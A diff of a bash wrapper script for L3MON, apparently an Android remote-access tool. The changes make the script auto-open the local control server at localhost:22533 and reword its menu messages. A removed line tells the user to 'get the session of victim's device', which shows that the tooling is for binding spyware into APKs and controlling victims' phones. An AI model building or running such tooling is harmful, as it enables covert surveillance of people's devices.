@@ -7,9 +7,10 @@ read choice
 if [[ $choice == y ]]
 then
 echo
-printf "\e[1;97;40m SERVER OF LEMON IS STARTING ....\e[0m\n"
+printf "\e[1;97;40m SERVER OF LEMON (url:- http://localhost:22533/) IS STARTING ....\e[0m\n"
+printf "\e[1;31m please reload the page when it opens in your browser\e[0m"
 sleep 2
-printf "\e[1;31;107m Login to your lemon server (url:-  http://localhost:22533/ )using any web browser and make your L3MON.apk file then again run this program to continue\e[0m\n"
+xdg-open http://localhost:22533/
 lemon
 else
 printf "\e[1;31m Continuing the program .........\e[0m\n"
@@ -100,11 +101,12 @@ printf "\e[1;31m L3MON_binded.signed.apk is either deleted previously or not fou
 fi
 elif [[ $uopt == 6 ]] || [[ $uopt == 06 ]]
 then
-printf "\e[1;97;40m SERVER OF LEMON IS STARTING ....\e[0m\n"
+printf "\e[1;97;40m SERVER OF L3MON (url:- http://localhost:22533/)  IS STARTING ....\e[0m\n"
+printf "\e[1;31m please reload the page when it opens in your browser\e[0m"
 sleep 2
-printf "\e[1;31;107m NOW login to your lemon server (url:- http://localhost:22533/ )  using any web browser and get the session of victim's device :)\e[0m\n"
 echo
 echo
+xdg-open http://localhost:22533/
 lemon
 elif [[ $uopt == quit ]]
 then
